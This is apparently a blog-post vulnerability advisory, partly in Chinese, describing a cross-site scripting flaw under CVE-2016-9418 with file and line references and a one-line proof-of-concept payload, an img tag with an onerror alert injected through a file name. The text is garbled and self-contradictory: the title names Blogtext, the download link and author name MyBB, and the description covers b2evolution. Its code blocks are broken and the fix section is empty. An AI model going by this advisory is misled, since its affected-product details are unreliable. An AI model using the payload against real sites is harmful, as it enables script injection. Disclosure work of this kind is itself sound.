---
layout: post
title: XSS  in Blogtext version 3.7.6 [CVE-2016-9418]
---

发现者: 陈瑞琦 

发现日期: 2016-08-28

下载地址: [MyBB](https://mybb.com/versions/)

作者: MyBB

作者通知日期: 2016-08-29

作者联系手段: 

CVE-ID：CVE-2016-9418

**描述:**

b2evolutioe is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a "one click install" web app.[3](Wiki)

**细节:** 
./inc/html.php
`code`
<pre><code>
line 133 function lien_pagination()

line 142 $qstring = remove_url_param('p');
<pre><code>
./inc/util.php
`code`
<pre><code>
line 358 function remove_url_param($param)
<pre><code>
**PoC:**

test<img src="0" onerror="alert(1)">.php

**Fix:**

